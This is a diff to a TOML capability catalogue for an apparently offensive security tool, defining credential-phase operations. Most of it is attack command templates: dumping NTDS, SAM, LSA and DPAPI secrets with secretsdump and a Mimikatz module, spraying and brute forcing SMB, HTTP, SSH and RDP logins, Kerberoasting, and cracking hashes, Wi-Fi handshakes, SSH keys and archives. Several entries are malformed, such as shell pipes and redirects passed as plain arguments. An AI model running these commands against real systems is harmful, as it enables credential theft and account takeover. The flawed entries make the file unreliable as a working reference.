@@ -9839,727 +9839,2085 @@ args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-x', 'hostnam
 output = 'lines'
 network = true
 
-# --------------------------------------------------------------------------
-# CREDENTIALS
-# --------------------------------------------------------------------------
+# ==========================================================================
+# PHASE 6 — CREDENTIALS
+# ==========================================================================
 
 [[capability]]
-id = 'credentials.local-dumping'
+id = 'credentials.hash-identification'
 phase = 'credentials'
-label = 'LOCAL DUMPING'
-summary = 'Parse LSASS minidumps and live LSA for credential material'
+label = 'HASH IDENTIFICATION'
+summary = 'Identify hash formats and estimate cracking difficulty'
 inputs = [
-  { key = 'dump', type = 'file', required = false, default = 'lsass.dmp' },
+  { key = 'hash', type = 'text', required = true },
 ]
 [[capability.provider]]
-binary = 'pypykatz'
+binary = 'hashid'
 [[capability.provider.operation]]
-name = 'Minidump Parse'
-args = ['lsa', 'minidump', '{dump}', '-o', 'pypykatz_lsa.json']
+name = 'Hash Identify'
+args = ['{hash}']
 output = 'lines'
-network = true
-
+network = false
 [[capability.provider.operation]]
-name = 'Live LSA'
-args = ['live', 'lsa', '-o', 'pypykatz_live.json']
+name = 'Hash Identify Extended'
+args = ['-e', '{hash}']
 output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'DPAPI Dump'
-args = ['dpapi', 'minidump', '{dump}']
-output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'lazagne'
+binary = 'hash-identifier'
 [[capability.provider.operation]]
-name = 'App Recovery'
-args = ['all']
+name = 'Identifier Fallback'
+args = ['{hash}']
 output = 'lines'
-network = true
+network = false
+[[capability.provider]]
+binary = 'name-that-hash'
+[[capability.provider.operation]]
+name = 'NTH Identify'
+args = ['-t', '{hash}']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Mode Suggest'
+args = ['--example-hashes', '-m', '0']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Mode List Grep'
+args = ['--help', '|', 'grep', '-i', 'sha']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'john'
+[[capability.provider.operation]]
+name = 'Format List'
+args = ['--list=formats']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'john'
+[[capability.provider.operation]]
+name = 'Format Test'
+args = ['--test', '--format=raw-sha1']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'echo'
+[[capability.provider.operation]]
+name = 'Hash Echo Verify'
+args = ['{hash}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Ref Compute Baseline'
+args = ['/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'md5sum'
+[[capability.provider.operation]]
+name = 'Ref MD5 Baseline'
+args = ['/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'openssl'
+[[capability.provider.operation]]
+name = 'Format Cross Check'
+args = ['passwd', '-1', '-apr1']
+output = 'lines'
+network = false
 
 [[capability]]
-id = 'credentials.hash-extraction'
+id = 'credentials.hash-cracking'
 phase = 'credentials'
-label = 'HASH EXTRACTION'
-summary = 'Extract NTLM hashes from directory services and local hives'
+label = 'HASH CRACKING'
+summary = 'Crack recovered hashes with rule and wordlist driven attacks'
 inputs = [
-  { key = 'target', type = 'target', required = true },
-  { key = 'domain', type = 'domain', required = true },
+  { key = 'hashes', type = 'file', required = true },
+  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
+  { key = 'mode', type = 'text', required = false, default = '1000' },
+]
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Dictionary Attack'
+args = ['-m', '{mode}', '-a', '0', '{hashes}', '{wordlist}', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Rule Attack'
+args = ['-m', '{mode}', '-a', '0', '{hashes}', '{wordlist}', '-r', '/usr/share/hashcat/rules/best64.rule', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Combination Attack'
+args = ['-m', '{mode}', '-a', '1', '{hashes}', '{wordlist}', '{wordlist}', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Mask Brute Force'
+args = ['-m', '{mode}', '-a', '3', '{hashes}', '?u?l?l?l?l?d?d?d?d', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Show Cracked'
+args = ['-m', '{mode}', '{hashes}', '--show']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Benchmark GPU'
+args = ['-b', '-m', '{mode}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'john'
+[[capability.provider.operation]]
+name = 'Wordlist Run'
+args = ['--wordlist={wordlist}', '{hashes}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'john'
+[[capability.provider.operation]]
+name = 'Rule Run'
+args = ['--wordlist={wordlist}', '--rules=Jumbo', '{hashes}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'john'
+[[capability.provider.operation]]
+name = 'Show Potfile'
+args = ['--show', '{hashes}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'john'
+[[capability.provider.operation]]
+name = 'Incremental Run'
+args = ['--incremental=Alnum', '{hashes}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'maskprocessor'
+[[capability.provider.operation]]
+name = 'Mask Generate Count'
+args = ['?u?l?l?l?l?d?d?d?d', '--cpu-time', '5']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'crunch'
+[[capability.provider.operation]]
+name = 'Wordlist Generate'
+args = ['4', '8', 'abcdefghijklmnopqrstuvwxyz0123456789', '-o', '/tmp/genlist.txt']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'credentials.ntlm-dump'
+phase = 'credentials'
+label = 'NTLM DUMP'
+summary = 'Dump Windows credential material from domain hosts'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
   { key = 'username', type = 'username', required = true },
   { key = 'password', type = 'password', required = true },
 ]
 [[capability.provider]]
 binary = 'impacket-secretsdump'
 [[capability.provider.operation]]
+name = 'SAM Dump'
+args = ['{rhost}/{username}:{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-secretsdump'
+[[capability.provider.operation]]
 name = 'NTDS Dump'
-args = ['{domain}@{target}', '-just-dc-ntlm']
+args = ['{rhost}/{username}:{password}', '-just-dc-user', 'administrator']
 output = 'lines'
 network = true
-
+[[capability.provider]]
+binary = 'impacket-secretsdump'
 [[capability.provider.operation]]
-name = 'Local Dump'
-args = ['-sam', '/tmp/sam', '-system', '/tmp/system', 'LOCAL']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Targeted Dump'
-args = ['{domain}@{target}', '-just-dc-user', 'krbtgt']
+name = 'Full NTDS Dump'
+args = ['{rhost}/{username}:{password}', '-just-dc']
 output = 'lines'
 network = true
 [[capability.provider]]
 binary = 'nxc'
 [[capability.provider.operation]]
-name = 'SAM Dump'
-args = ['smb', '{target}', '-u', '{username}', '-p', '{password}', '--sam']
+name = 'SAM via SMB'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--sam']
 output = 'lines'
 network = true
-
+[[capability.provider]]
+binary = 'nxc'
 [[capability.provider.operation]]
-name = 'NTDS Dump'
-args = ['smb', '{target}', '-u', '{username}', '-p', '{password}', '--ntds', 'drsuapi']
+name = 'LSA Dump'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--lsa']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'DPAPI Dump'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--dpapi']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'NTDS via ntdsutil'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--ntds']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Mimikatz Logonpasswords'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'mimikatz', '-o', 'COMMAND=privilege::debug', 'sekurlsa::logonpasswords']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'crackmapexec'
+[[capability.provider.operation]]
+name = 'Compat SAM Dump'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--sam']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'NTLM Crack Pass'
+args = ['-m', '1000', '-a', '0', '/tmp/ntds.ntds', '/usr/share/wordlists/rockyou.txt', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Kerberoast Crack'
+args = ['-m', '13100', '-a', '0', '/tmp/kerberoast.out', '/usr/share/wordlists/rockyou.txt', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'ASREP Crack'
+args = ['-m', '18200', '-a', '0', '/tmp/asrep.out', '/usr/share/wordlists/rockyou.txt', '--potfile-disable']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'credentials.smb-auth-spray'
+phase = 'credentials'
+label = 'SMB AUTH SPRAY'
+summary = 'Test and spray SMB credentials across target hosts'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+  { key = 'userlist', type = 'file', required = false, default = '/tmp/users.txt' },
+  { key = 'passlist', type = 'file', required = false, default = '/tmp/passwords.txt' },
+]
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Single Cred Test'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'User Password Pair Spray'
+args = ['smb', '{rhost}', '-u', '{userlist}', '-p', '{passlist}', '--no-bruteforce']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Password Across Users'
+args = ['smb', '{rhost}', '-u', '{userlist}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Null Session Test'
+args = ['smb', '{rhost}', '-u', 'guest', '-p', '']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hydra'
+[[capability.provider.operation]]
+name = 'SMB Brute'
+args = ['-L', '{userlist}', '-P', '{passlist}', '{rhost}', 'smb']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'medusa'
+[[capability.provider.operation]]
+name = 'SMB Alt Brute'
+args = ['-H', '{rhost}', '-U', '{userlist}', '-P', '{passlist}', '-M', 'smb']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'crackmapexec'
+[[capability.provider.operation]]
+name = 'Compat Spray'
+args = ['smb', '{rhost}', '-u', '{userlist}', '-p', '{passlist}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'SMB User Script'
+args = ['-sV', '-p', '445', '--script', 'smb-enum-users', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'enum4linux-ng'
+[[capability.provider.operation]]
+name = 'User Enum Alt'
+args = ['-u', '{username}', '-p', '{password}', '-U', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-lookupsid'
+[[capability.provider.operation]]
+name = 'User SID Harvest'
+args = ['{rhost}/guest:']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'rpcclient'
+[[capability.provider.operation]]
+name = 'User Name Enum'
+args = ['{rhost}', '-U', '{username}%{password}', '-c', 'enumdomusers']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Share Access Check'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '--shares']
 output = 'lines'
 network = true
 
 [[capability]]
-id = 'credentials.password-cracking'
+id = 'credentials.http-auth-brute'
 phase = 'credentials'
-label = 'PASSWORD CRACKING'
-summary = 'Offline dictionary and mask attacks against captured hashes'
+label = 'HTTP AUTH BRUTE'
+summary = 'Brute force HTTP basic, form and API authentication'
 inputs = [
-  { key = 'hash', type = 'hash', required = true },
-  { key = 'wordlist', type = 'file', required = false },
+  { key = 'url', type = 'url', required = true },
+  { key = 'username', type = 'username', required = false, default = 'admin' },
+  { key = 'passlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
 ]
+[[capability.provider]]
+binary = 'hydra'
+[[capability.provider.operation]]
+name = 'Basic Auth Brute'
+args = ['-l', '{username}', '-P', '{passlist}', '{url}', 'http-get', '/admin']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hydra'
+[[capability.provider.operation]]
+name = 'Form Post Brute'
+args = ['-l', '{username}', '-P', '{passlist}', '{url}', 'http-post-form', '/login:user=^USER^&pass=^PASS^:F=incorrect']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hydra'
+[[capability.provider.operation]]
+name = 'HTTP Digest Brute'
+args = ['-l', '{username}', '-P', '{passlist}', '{url}', 'http-digest-get', '/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'medusa'
+[[capability.provider.operation]]
+name = 'HTTP Alt Brute'
+args = ['-U', '/tmp/users.txt', '-P', '{passlist}', '-h', '{url}', '-M', 'http']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'Login Fuzz'
+args = ['-u', '{url}/login', '-X', 'POST', '-d', 'username=admin&password=FUZZ', '-w', '{passlist}', '-mc', '200,302', '-t', '10']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'wfuzz'
+[[capability.provider.operation]]
+name = 'Login Alt Fuzz'
+args = ['-z', 'file,{passlist}', '-d', 'username=admin&password=FUZZ', '{url}/login']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Basic Auth Manual Test'
+args = ['-sk', '-o', '/dev/null', '-w', '%{http_code}', '-u', '{username}:{password}', '{url}/admin']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'NTLM Auth Probe'
+args = ['-sk', '--ntlm', '-u', '{username}:{password}', '{url}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Bearer Token Probe'
+args = ['-sk', '-H', 'Authorization: Bearer test123', '{url}/api/user']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Default Cred Templates'
+args = ['-u', '{url}', '-tags', 'default-login', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Exposed Panel Templates'
+args = ['-u', '{url}', '-tags', 'panel,login', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'Login Page Discover'
+args = ['-u', '{url}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/big.txt', '-mc', '200', '-t', '20']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'credentials.service-login-brute'
+phase = 'credentials'
+label = 'SERVICE LOGIN BRUTE'
+summary = 'Brute force network service authentication across protocols'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'passlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
+]
+[[capability.provider]]
+binary = 'hydra'
+[[capability.provider.operation]]
+name = 'SSH Brute'
+args = ['-l', '{username}', '-P', '{passlist}', '{rhost}', 'ssh', '-t', '4']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hydra'
+[[capability.provider.operation]]
+name = 'FTP Brute'
+args = ['-l', '{username}', '-P', '{passlist}', '{rhost}', 'ftp']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hydra'
+[[capability.provider.operation]]
+name = 'MySQL Brute'
+args = ['-l', 'root', '-P', '{passlist}', '{rhost}', 'mysql']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hydra'
+[[capability.provider.operation]]
+name = 'Postgres Brute'
+args = ['-l', 'postgres', '-P', '{passlist}', '{rhost}', 'postgres']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hydra'
+[[capability.provider.operation]]
+name = 'RDP Brute'
+args = ['-l', 'administrator', '-P', '{passlist}', '{rhost}', 'rdp']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hydra'
+[[capability.provider.operation]]
+name = 'Telnet Brute'
+args = ['-l', 'admin', '-P', '{passlist}', '{rhost}', 'telnet']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hydra'
+[[capability.provider.operation]]
+name = 'VNC Brute'
+args = ['-P', '{passlist}', '{rhost}', 'vnc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hydra'
+[[capability.provider.operation]]
+name = 'SMTP Brute'
+args = ['-l', '{username}', '-P', '{passlist}', '{rhost}', 'smtp']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hydra'
+[[capability.provider.operation]]
+name = 'POP3 Brute'
+args = ['-l', '{username}', '-P', '{passlist}', '{rhost}', 'pop3']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ncrack'
+[[capability.provider.operation]]
+name = 'SSH Alt Brute'
+args = ['ssh:{rhost}', '-U', '{username}', '-P', '{passlist}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ncrack'
+[[capability.provider.operation]]
+name = 'RDP Alt Brute'
+args = ['rdp:{rhost}', '-P', '{passlist}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'medusa'
+[[capability.provider.operation]]
+name = 'SSH Alt Brute'
+args = ['-H', '{rhost}', '-u', '{username}', '-P', '{passlist}', '-M', 'ssh']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'credentials.kerberoast'
+phase = 'credentials'
+label = 'KERBEROAST'
+summary = 'Harvest and crack service account tickets in the domain'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'domain', type = 'domain', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
+]
+[[capability.provider]]
+binary = 'impacket-getUserSPNs'
+[[capability.provider.operation]]
+name = 'SPN Harvest'
+args = ['{domain}/{username}:{password}@{rhost}', '-outputfile', '/tmp/kerberoast.out']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-getUserSPNs'
+[[capability.provider.operation]]
+name = 'Request All Tickets'
+args = ['{domain}/{username}:{password}@{rhost}', '-request']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Kerberoast via nxc'
+args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}', '--kerberoasting', '/tmp/kerberoast.out']
+output = 'lines'
+network = true
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
-name = 'Dictionary Attack'
-args = ['-m', '1000', '-a', '0', '{hash}', '{wordlist}', '-r', 'rules/best64.rule']
-output = 'lines'
-network = false
-
-[[capability.provider.operation]]
-name = 'Mask Attack'
-args = ['-m', '1000', '-a', '3', '{hash}', '?1?1?1?1?1?1d?d']
-output = 'lines'
-network = false
-
-[[capability.provider.operation]]
-name = 'Cracked Report'
-args = ['-m', '1000', '{hash}', '--show']
-output = 'lines'
-network = false
-
-[[capability.provider.operation]]
-name = 'Uncracked Report'
-args = ['-m', '1000', '{hash}', '--left']
+name = 'Ticket Crack'
+args = ['-m', '13100', '-a', '0', '/tmp/kerberoast.out', '{wordlist}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'john'
 [[capability.provider.operation]]
-name = 'NTLM Audit'
-args = ['--wordlist={wordlist}', '--format=NT', '{hash}']
+name = 'Ticket Crack Alt'
+args = ['--wordlist={wordlist}', '--format=krb5tgs', '/tmp/kerberoast.out']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'impacket-GetNPUsers'
+[[capability.provider.operation]]
+name = 'ASREP Harvest'
+args = ['{domain}/', '-usersfile', '/tmp/users.txt', '-no-pass', '-outputfile', '/tmp/asrep.out']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'ASREP Crack'
+args = ['-m', '18200', '-a', '0', '/tmp/asrep.out', '{wordlist}', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'impacket-findDelegation'
+[[capability.provider.operation]]
+name = 'Delegation Enum'
+args = ['{domain}/{username}:{password}@{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Delegation via nxc'
+args = ['ldap', '{rhost}', '-u', '{username}', '-p', '{password}', '--delegate']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-getTGT'
+[[capability.provider.operation]]
+name = 'TGT Pull'
+args = ['{domain}/{username}:{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-getST'
+[[capability.provider.operation]]
+name = 'Service Ticket Request'
+args = ['{domain}/{username}:{password}', '-spn', 'cifs/{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'klist'
+[[capability.provider.operation]]
+name = 'Ticket Cache Show'
+args = ['-kt']
 output = 'lines'
 network = false
 
+[[capability]]
+id = 'credentials.wifi-handshake-crack'
+phase = 'credentials'
+label = 'WIFI HANDSHAKE CRACK'
+summary = 'Crack captured WPA handshakes and PMKIDs'
+inputs = [
+  { key = 'capture', type = 'file', required = false, default = '/tmp/capture.cap' },
+  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
+]
+[[capability.provider]]
+binary = 'aircrack-ng'
 [[capability.provider.operation]]
-name = 'Kerberoast Audit'
-args = ['--wordlist={wordlist}', '--format=krb5tgs', '{hash}']
+name = 'Handshake Crack'
+args = ['-w', '{wordlist}', '{capture}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'aircrack-ng'
+[[capability.provider.operation]]
+name = 'Handshake Check'
+args = ['-c', '6', '{capture}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'WPA Crack 22000'
+args = ['-m', '22000', '-a', '0', '{capture}', '{wordlist}', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'PMKID Crack 16800'
+args = ['-m', '16800', '-a', '0', '/tmp/pmkid.16800', '{wordlist}', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'WEP Crack 1'
+args = ['-m', '1', '-a', '0', '{capture}', '{wordlist}', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'airdecap-ng'
+[[capability.provider.operation]]
+name = 'Capture Decrypt Verify'
+args = ['-e', 'TestSSID', '-p', 'password', '{capture}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'john'
+[[capability.provider.operation]]
+name = 'WPA Crack Alt'
+args = ['--wordlist={wordlist}', '{capture}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Handshake Extract'
+args = ['-r', '{capture}', '-Y', 'eap wlan rsn']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'pyrit'
+[[capability.provider.operation]]
+name = 'Handshake Analyze'
+args = ['analyze', '-r', '{capture}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hcxpcapngtool'
+[[capability.provider.operation]]
+name = 'HC22000 Convert'
+args = ['-o', '/tmp/out.22000', '{capture}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'besside-ng'
+[[capability.provider.operation]]
+name = 'Auto Crack Attempt'
+args = ['-c', '6', '-W', '{capture}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Potfile Check'
+args = ['-m', '22000', '--show', '{capture}']
 output = 'lines'
 network = false
 
+[[capability]]
+id = 'credentials.ssh-key-crack'
+phase = 'credentials'
+label = 'SSH KEY CRACK'
+summary = 'Recover SSH private key passphrases and test key reuse'
+inputs = [
+  { key = 'key', type = 'file', required = true },
+  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
+  { key = 'rhost', type = 'target', required = false, default = '' },
+]
+[[capability.provider]]
+binary = 'ssh2john'
 [[capability.provider.operation]]
-name = 'Show Cracked'
-args = ['--show', '--format=NT', '{hash}']
+name = 'Key To Hash'
+args = ['{key}', '>', '/tmp/ssh.hash']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'john'
+[[capability.provider.operation]]
+name = 'Passphrase Crack'
+args = ['--wordlist={wordlist}', '/tmp/ssh.hash']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'john'
+[[capability.provider.operation]]
+name = 'Show Cracked Pass'
+args = ['--show', '/tmp/ssh.hash']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'RSA Key Crack'
+args = ['-m', '22921', '-a', '0', '/tmp/ssh.hash', '{wordlist}', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ssh-keygen'
+[[capability.provider.operation]]
+name = 'Key Fingerprint'
+args = ['-l', '-f', '{key}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Key Format Check'
+args = ['{key}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Key Header Read'
+args = ['{key}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ssh'
+[[capability.provider.operation]]
+name = 'Key Auth Test'
+args = ['-i', '{key}', '-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no', 'root@{rhost}', 'id']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ssh-keyscan'
+[[capability.provider.operation]]
+name = 'Host Key Pull'
+args = ['{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Key Encrypt Check'
+args = ['-c', 'ENCRYPTED', '{key}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'find'
+[[capability.provider.operation]]
+name = 'Key Inventory Sweep'
+args = ['/', '-name', 'id_rsa', '-o', '-name', 'id_ed25519', '-type', 'f', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'openssl'
+[[capability.provider.operation]]
+name = 'Key Detail Parse'
+args = ['rsa', '-in', '{key}', '-noout', '-text']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'credentials.zip-archive-crack'
+phase = 'credentials'
+label = 'ZIP ARCHIVE CRACK'
+summary = 'Recover passwords from encrypted archives'
+inputs = [
+  { key = 'archive', type = 'file', required = true },
+  { key = 'wordlist', type = 'file', required = false, default = '/usr/share/wordlists/rockyou.txt' },
+]
+[[capability.provider]]
+binary = 'fcrackzip'
+[[capability.provider.operation]]
+name = 'Dictionary Crack'
+args = ['-D', '-p', '{wordlist}', '-u', '{archive}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'fcrackzip'
+[[capability.provider.operation]]
+name = 'Brute Force Crack'
+args = ['-b', '-c', 'aA1', '-l', '1-6', '-u', '{archive}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'zip2john'
+[[capability.provider.operation]]
+name = 'Zip To Hash'
+args = ['{archive}', '>', '/tmp/zip.hash']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'john'
+[[capability.provider.operation]]
+name = 'Zip Hash Crack'
+args = ['--wordlist={wordlist}', '/tmp/zip.hash']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Zip PKZIP Crack'
+args = ['-m', '17200', '-a', '0', '/tmp/zip.hash', '{wordlist}', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'unzip'
+[[capability.provider.operation]]
+name = 'Archive Verify Open'
+args = ['-t', '{archive}', '-P', 'password']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = '7z'
+[[capability.provider.operation]]
+name = '7z Crack Attempt'
+args = ['t', '-ppassword', '{archive}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'rar2john'
+[[capability.provider.operation]]
+name = 'Rar To Hash'
+args = ['{archive}', '>', '/tmp/rar.hash']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'unrar'
+[[capability.provider.operation]]
+name = 'Rar Crack Attempt'
+args = ['t', '-ppassword', '{archive}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Archive Format Check'
+args = ['{archive}']
+output = 'lines'
